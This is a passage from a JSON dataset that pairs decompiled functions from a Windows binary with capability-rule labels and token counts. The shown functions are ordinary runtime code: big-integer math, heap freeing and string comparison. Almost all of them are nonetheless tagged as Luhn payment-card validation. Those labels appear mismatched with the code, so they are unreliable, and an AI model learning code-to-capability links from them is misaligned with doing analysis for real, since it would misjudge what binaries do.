        "decompiled_code": "\nint32_t fcn.004459c0(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    \n    puVar5 = param_1 + 0x14;\n    puVar1 = puVar5 + *(param_1 + 0x10);\n    if (puVar1 <= puVar5) {\n        return 0;\n    }\n    uVar2 = *(param_1 + 0x14);\n    iVar4 = 0;\n    while( true ) {\n        if (uVar2 != 0) {\n            iVar3 = 0;\n            for (; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n                iVar3 = iVar3 + 1;\n            }\n            return iVar4 + iVar3;\n        }\n        puVar5 = puVar5 + 1;\n        iVar4 = iVar4 + 0x20;\n        if (puVar1 <= puVar5) break;\n        uVar2 = *puVar5;\n    }\n    return iVar4;\n}\n",
        "token_count": 269
    },
    "00445a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00445a10(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0x30;\n    iVar3 = 0;\n    do {\n        *(uVar2 + 0x56be00) = iVar3 + '\\x10';\n        puVar1 = iVar3 + 0x5278e7;\n        uVar2 = *puVar1;\n        iVar3 = iVar3 + 1;\n    } while (*puVar1 != 0);\n    uVar2 = 0x61;\n    iVar3 = 0;\n    do {\n        *(uVar2 + 0x56be00) = iVar3 + '\\x1a';\n        puVar1 = iVar3 + 0x5278e0;\n        uVar2 = *puVar1;\n        iVar3 = iVar3 + 1;\n    } while (*puVar1 != 0);\n    uVar2 = 0x41;\n    iVar3 = 0;\n    do {\n        *(uVar2 + 0x56be00) = iVar3 + '\\x1a';\n        puVar1 = iVar3 + 0x5278d9;\n        uVar2 = *puVar1;\n        iVar3 = iVar3 + 1;\n    } while (*puVar1 != 0);\n    return;\n}\n",
        "token_count": 307
    },
    "00446070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00446070(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    iVar6 = 0;\n    iVar1 = *(param_1 + 0x10);\n    iVar7 = param_3 >> 0x1f;\n    do {\n        uVar2 = *(param_1 + 0x14 + iVar6 * 4);\n        iVar3 = uVar2 * param_2;\n        uVar4 = iVar3;\n        iVar5 = uVar4 + param_3;\n        param_3 = (iVar3 >> 0x20) + (param_2 >> 0x1f) * uVar2 + iVar7 + CARRY4(uVar4, param_3);\n        *(param_1 + 0x14 + iVar6 * 4) = iVar5;\n        iVar7 = 0;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < iVar1);\n    if (param_3 != 0) {\n        if (*(param_1 + 8) == iVar1 || *(param_1 + 8) < iVar1) {\n            iVar6 = fcn.00445f30(*(param_1 + 4) + 1);\n            if (iVar6 == 0) {\n                return 0;\n            }\n            sub.msvcrt.dll_memcpy(iVar6 + 0xc, param_1 + 0xc, *(param_1 + 0x10) * 4 + 8);\n            fcn.00446000(param_1);\n            param_1 = iVar6;\n        }\n        *(param_1 + 0x14 + iVar1 * 4) = param_3;\n        *(param_1 + 0x10) = iVar1 + 1;\n    }\n    return param_1;\n}\n",
        "token_count": 456
    },
    "00446160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00446160(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00445f30(1);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x10) = 1;\n        *(iVar1 + 0x14) = param_1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00446190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00446190(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint32_t *puVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    int32_t iVar15;\n    uint32_t *puVar16;\n    int32_t iVar17;\n    uint32_t uStack76;\n    uint32_t *puStack64;\n    uint32_t *puStack52;\n    int32_t iStack44;\n    uint32_t *puVar14;\n    \n    iVar17 = *(param_1 + 0x10);\n    iVar3 = *(param_2 + 0x10);\n    iVar12 = iVar3;\n    iVar15 = param_2;\n    if (iVar17 < iVar3) {\n        iVar12 = iVar17;\n        iVar15 = param_1;\n        param_1 = param_2;\n        iVar17 = iVar3;\n    }\n    iVar3 = iVar17 + iVar12;\n    iVar7 = fcn.00445f30((*(param_1 + 8) < iVar3) + *(param_1 + 4));\n    if (iVar7 != 0) {\n        puStack52 = iVar7 + 0x14;\n        puVar1 = puStack52 + iVar3;\n        for (puVar8 = puStack52; puVar8 < puVar1; puVar8 = puVar8 + 1) {\n            *puVar8 = 0;\n        }\n        puVar8 = iVar15 + 0x14;\n        puVar2 = puVar8 + iVar12;\n        while (puStack64 = puVar8,  puVar8 < puVar2) {\n            while( true ) {\n                puVar8 = puStack64 + 1;\n                uVar4 = *puStack64;\n                if (uVar4 == 0) break;\n                uStack76 = 0;\n                puVar13 = param_1 + 0x14;\n                puVar6 = puStack52;\n                do {\n                    puVar16 = puVar6;\n                    puVar14 = puVar13 + 1;\n                    iVar5 = uVar4 * *puVar13;\n                    uVar9 = iVar5;\n                    uVar10 = uVar9 + *puVar16;\n                    uVar11 = uVar10 + uStack76;\n                    uStack76 = (iVar5 >> 0x20) + CARRY4(uVar9, *puVar16) + CARRY4(uVar10, uStack76);\n                    *puVar16 = uVar11;\n                    puVar13 = puVar14;\n                    puVar6 = puVar16 + 1;\n                } while (puVar14 < param_1 + 0x14 + iVar17);\n                puStack52 = puStack52 + 1;\n                puVar16[1] = uStack76;\n                puStack64 = puVar8;\n                if (puVar2 <= puVar8) goto code_r0x004462af;\n            }\n            puStack52 = puStack52 + 1;\n        }\ncode_r0x004462af:\n        iStack44 = iVar3;\n        if (0 < iVar3) {\n            uVar4 = puVar1[-1];\n            iVar17 = iVar3;\n            while ((iStack44 = iVar17,  uVar4 == 0 && (iStack44 = iVar17 + -1,  iStack44 != 0))) {\n                uVar4 = puVar1[(iVar17 + -2) - iVar3];\n                iVar17 = iStack44;\n            }\n        }\n        *(iVar7 + 0x10) = iStack44;\n    }\n    return iVar7;\n}\n",
        "token_count": 886
    },
    "00446ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00446ba0(char **param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar3 = *param_1;\n    do {\n        cVar1 = *param_2;\n        pcVar3 = pcVar3 + 1;\n        if (cVar1 == 0) {\n            *param_1 = pcVar3;\n            return 1;\n        }\n        iVar2 = *pcVar3;\n        if (iVar2 - 0x41U < 0x1a) {\n            iVar2 = iVar2 + 0x20;\n        }\n        param_2 = param_2 + 1;\n    } while (iVar2 == cVar1);\n    return 0;\n}\n",
        "token_count": 177
    },
    "004c3080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c3080(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *extraout_EDX;\n    int32_t **ppiVar6;\n    int32_t *unaff_EDI;\n    ulong uVar7;\n    int32_t iStack32;\n    \n    if ((param_1 - 0x60U <= *0x515d24) || (*0x515d24 + *0x515d28 <= param_1 - 0x60U)) {\n    // WARNING: Could not recover jumptable at 0x00446e88. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)();\n        return;\n    }\n    if ((*0x515a34 == 0) || (iVar2 = fcn.004382e0(0x515d18),  iVar2 == 0)) {\n        unaff_EDI = param_1 + -0x70;\n        if (*0x515d20 == NULL) goto code_r0x00448330;\n        iStack32 = *(param_1 + -0x70);\n        piVar1 = unaff_EDI + iStack32;\n        if (piVar1 < *0x515d20) goto code_r0x00448330;\n        piVar3 = (*0x515d20)[1];\n        if (*0x515d20 == piVar1) {\n            iVar2 = **0x515d20;\n            *(param_1 + -0x6c) = piVar3;\n            *(param_1 + -0x70) = iStack32 + iVar2;\n            *0x515d20 = unaff_EDI;\n            goto joined_r0x00448310;\n        }\n        piVar4 = *0x515d20;\n        if (piVar3 == NULL) {\n            piVar3 = NULL;\n            ppiVar6 = 0x515d20;\n        }\n        else {\n            piVar5 = *0x515d20;\n            if (piVar1 < piVar3) {\n                do {\n                    piVar4 = piVar3;\n                    piVar3 = piVar4[1];\n                    ppiVar6 = piVar5 + 1;\n                    if (piVar3 == NULL) break;\n                    piVar5 = piVar4;\n                } while (piVar1 < piVar3);\n            }\n            else {\n                ppiVar6 = 0x515d20;\n            }\n        }\n        if (piVar3 == piVar1) {\n            iStack32 = iStack32 + *piVar3;\n            piVar4[1] = piVar3[1];\n        }\n        piVar1 = *ppiVar6;\n        uVar7 = CONCAT44(*piVar1, piVar1);\n        if (unaff_EDI != piVar1 + *piVar1) {\n            *(param_1 + -0x6c) = piVar1[1];\n            piVar1 = *ppiVar6;\n            *(param_1 + -0x70) = iStack32;\n            piVar1[1] = unaff_EDI;\n            goto joined_r0x00448310;\n        }\n    }\n    else {\n        uVar7 = fcn.00449d10();\n    }\n    *uVar7 = (uVar7 >> 0x20) + iStack32;\njoined_r0x00448310:\n    while ((*0x515a34 != 0 && (iVar2 = fcn.00438340(0x515d18),  iVar2 != 0))) {\n        fcn.00449d40();\n        *0x515d20 = extraout_EDX;\ncode_r0x00448330:\n        *(param_1 + -0x6c) = *0x515d20;\n        *0x515d20 = unaff_EDI;\n    }\n    return;\n}\n",
        "token_count": 898
    },
    "00448140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00448140(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x515bf0 != '\\0') {\n        return 0x5174e0;\n    }\n    iVar1 = fcn.004c3130(0x515bf0);\n    if (iVar1 != 0) {\n        if (*0x515a34 != 0) {\n            fcn.00438280(0x5174e0);\n        }\n        fcn.004c3210(0x515bf0);\n        fcn.004014c0(0x4c3b30);\n    }\n    return 0x5174e0;\n}\n",
        "token_count": 147
    },
    "00448200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00448200(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x515bf8 != '\\0') {\n        return 0x5174f0;\n    }\n    iVar1 = fcn.004c3130(0x515bf8);\n    if (iVar1 == 0) {\n        return 0x5174f0;\n    }\n    fcn.004c3210(0x515bf8);\n    fcn.004014c0(0x4c3b90);\n    return 0x5174f0;\n}\n",
        "token_count": 127
    },
    "004485a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004485a0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint var_3ch;\n    uint var_30h;\n    \n    (*_sym.imp.KERNEL32.dll_FreeConsole)();\n    fcn.004030de();\n    *in_ECX = *in_ECX + arg_8h;\n    in_ECX[1] = in_ECX[1] + arg_ch;\n    return in_ECX;\n}\n",
        "token_count": 114
    },
    "0044abc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0044abc0(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.msvcrt.dll_strerror(param_3);\n    *param_1 = param_1 + 2;\n    iVar2 = -1;\n    if (iVar1 != 0) {\n        iVar2 = sub.msvcrt.dll_strlen(iVar1);\n        iVar2 = iVar2 + iVar1;\n    }\n    fcn.004b02f0(iVar1, iVar2, 0);\n    return param_1;\n}\n",
        "token_count": 145
    },
    "0044bf30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0044bf30(int32_t *param_1, char param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_1;\n    if (param_3 < *(iVar2 + -0xc)) {\n        cVar1 = *(iVar2 + param_3);\n        while (param_2 == cVar1) {\n            param_3 = param_3 + 1;\n            if (param_3 == *(iVar2 + -0xc)) goto code_r0x0044bf5e;\n            cVar1 = *(iVar2 + param_3);\n        }\n    }\n    else {\ncode_r0x0044bf5e:\n        param_3 = 0xffffffff;\n    }\n    return param_3;\n}\n",
        "token_count": 185
    },
    "0044e150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0044e150(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint32_t in_stack_ffffffb4;\n    uint *puVar2;\n    int32_t var_24h;\n    int32_t var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    puVar2 = &var_24h;\n    fcn.00494010(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0xc), &var_24h, arg_ch, arg_10h);\n    if (var_ch != NULL) {\n        *in_ECX = in_ECX + 2;\n        fcn.004b02f0(var_24h, var_20h + var_24h, puVar2 & 0xffffff00);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.004be210(\"uninitialized __any_string\");\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    do {\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.00453450();\n        fcn.004af570();\n    } while( true );\n}\n",
        "token_count": 666
    },
    "0044e380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0044e380(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint32_t in_stack_ffffffb4;\n    uint *puVar2;\n    int32_t var_24h;\n    int32_t var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    puVar2 = &var_24h;\n    fcn.004937b0(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 arg_18h[1]);\n    if (var_ch != NULL) {\n        *in_ECX = in_ECX + 2;\n        fcn.004b02f0(var_24h, var_20h + var_24h, puVar2 & 0xffffff00);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.004be210(\"uninitialized __any_string\");\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    do {\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.00453450();\n        fcn.004af570();\n    } while( true );\n}\n",
        "token_count": 665
    },
    "0044f7e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0044f7e0(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    float10 fVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    uint in_stack_00000060;\n    uint in_stack_00000064;\n    uint in_stack_00000068;\n    uint in_stack_0000006c;\n    uint32_t in_stack_ffffff78;\n    uint32_t in_stack_ffffff8c;\n    ushort in_stack_ffffff9e;\n    uint in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint var_40h;\n    uint var_3ch;\n    uint in_stack_ffffffc4;\n    uint *var_34h;\n    uint in_stack_ffffffcc;\n    uint var_2ch;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint in_stack_ffffffe4;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    uint var_bp_ch;\n    \n    var_34h = &var_2ch;\n    fcn.004b03b0(*arg_1ch, arg_1ch[1] + *arg_1ch, in_stack_ffffff8c & 0xffffff00);\n    var_40h._0_1_ = arg_18h;\n    fVar1 = 0;\n    uVar2 = fcn.004919f0(in_stack_ffffff78 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h & 0xff, arg_14h, var_40h\n                         , SUB104(fVar1, 0), fVar1 >> 0x20, CONCAT22(in_stack_ffffff9e, fVar1 >> 0x40), &var_34h, \n                         in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0, in_stack_ffffffb4, \n                         in_stack_ffffffb8, arg_18h, var_3ch, in_stack_ffffffc4, var_34h, in_stack_ffffffcc, var_2ch, \n                         in_stack_ffffffd4, in_stack_ffffffd8, in_stack_ffffffdc, 0x493700, in_stack_ffffffe4, \n                         in_stack_ffffffe8, in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr\n                         , arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, in_stack_0000001c, in_stack_00000020, \n                         in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, \n                         in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, \n                         in_stack_0000004c, in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c, \n                         in_stack_00000060, in_stack_00000064, in_stack_00000068, in_stack_0000006c);\n    (*0x493700)(&var_34h);\n    return uVar2;\n}\n",
        "token_count": 1147
    },
    "00450410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00450410(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    \n    piVar1 = *param_1;\n    bVar4 = piVar1 != NULL && *(param_1 + 1) == -1;\n    bVar5 = *(param_1 + 1) == -1;\n    if (bVar4) {\n        if (piVar1[2] < piVar1[3]) {\n            in_EAX = *piVar1[2];\n        }\n        else {\n            in_EAX = (**(*piVar1 + 0x24))();\n        }\n        bVar5 = false;\n        if (in_EAX == -1) {\n            *param_1 = NULL;\n            bVar5 = bVar4;\n        }\n    }\n    piVar1 = *param_2;\n    uVar3 = in_EAX & 0xffffff00;\n    bVar2 = piVar1 != NULL && *(param_2 + 1) == -1;\n    bVar4 = *(param_2 + 1) == -1;\n    if (bVar2) {\n        if (piVar1[2] < piVar1[3]) {\n            uVar3 = *piVar1[2];\n        }\n        else {\n            uVar3 = (**(*piVar1 + 0x24))();\n        }\n        bVar4 = false;\n        if (uVar3 == -1) {\n            *param_2 = NULL;\n            bVar4 = bVar2;\n        }\n    }\n    return uVar3 & 0xffffff00 | bVar5 == bVar4;\n}\n",
        "token_count": 408
    },
    "004504b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004504b0(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == -1) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            param_2 = *piVar1[2];\n        }\n        else {\n            param_2 = (**(*piVar1 + 0x24))();\n        }\n        if (param_2 == -1) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 157
    },
    "00450500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00450500(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == -1) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            param_2 = *piVar1[2];\n        }\n        else {\n            param_2 = (**(*piVar1 + 0x24))();\n        }\n        if (param_2 == -1) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 156
    },
    "00451af0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00451af0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        if (*0x515a34 == 0) {\n            iVar1 = *0x516f0c + 1;\n            *0x516f0c = iVar1;\n            *param_1 = iVar1;\n        }\n        else {\n            LOCK();\n            iVar1 = *0x516f0c + 1;\n            *0x516f0c = *0x516f0c + 1;\n            *param_1 = iVar1;\n        }\n    }\n    return iVar1 + -1;\n}\n",
        "token_count": 163
    },
    "00454ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00454ae0(int32_t *param_1, char param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    \n    if (param_3 < param_1[1]) {\n        cVar1 = *(*param_1 + param_3);\n        while (param_2 == cVar1) {\n            param_3 = param_3 + 1;\n            if (param_3 == param_1[1]) goto code_r0x00454b0e;\n            cVar1 = *(*param_1 + param_3);\n        }\n    }\n    else {\ncode_r0x00454b0e:\n        param_3 = 0xffffffff;\n    }\n    return param_3;\n}\n",
        "token_count": 167
    },
    "00454fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00454fe0(uint *param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar1 = param_1[1];\n    uVar2 = sub.msvcrt.dll_strlen(param_2);\n    uVar3 = uVar1;\n    if (uVar2 <= uVar1) {\n        uVar3 = uVar2;\n    }\n    if ((uVar3 != 0) && (iVar4 = sub.msvcrt.dll_memcmp(*param_1, param_2, uVar3),  iVar4 != 0)) {\n        return iVar4;\n    }\n    return uVar1 - uVar2;\n}\n",
        "token_count": 177
    },
    "00456330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00456330(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_strcoll(param_1, param_2);\n    return iVar1 != 0 | iVar1 >> 0x1e;\n}\n",
        "token_count": 66
    },
    "00456360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00456432)\n\nint32_t __cdecl fcn.00456360(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    puVar5 = &fcn.00456360::var_40h;\n    uVar7 = 0x45638c;\n    fcn.004b02f0(arg_8h, arg_ch, 0);\n    var_30h = &fcn.00456360::var_28h;\n    fcn.004b02f0(arg_10h, arg_14h, uVar7 & 0xffffff00);\n    iVar1 = var_44h + puVar5;\n    var_2ch = var_2ch + var_30h;\n    puVar6 = var_30h;\n    do {\n        iVar4 = fcn.00456330(puVar5, puVar6);\n        if (iVar4 != 0) {\ncode_r0x00456416:\n            if (var_30h != &fcn.00456360::var_28h) {\n                fcn.004c2c30();\n            }\n            return iVar4;\n        }\n        iVar2 = sub.msvcrt.dll_strlen();\n        iVar2 = puVar5 + iVar2;\n        iVar3 = sub.msvcrt.dll_strlen();\n        iVar3 = puVar6 + iVar3;\n        if ((iVar1 == iVar2) && (var_2ch == iVar3)) goto code_r0x00456416;\n        if (iVar1 == iVar2) {\n            iVar4 = -1;\n            goto code_r0x00456416;\n        }\n        if (var_2ch == iVar3) {\n            iVar4 = 1;\n            goto code_r0x00456416;\n        }\n        puVar5 = iVar2 + 1;\n        puVar6 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 563
    },
    "00456740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00456740(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_wcscoll(param_1, param_2);\n    return iVar1 != 0 | iVar1 >> 0x1e;\n}\n",
        "token_count": 67
    },
    "00456770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
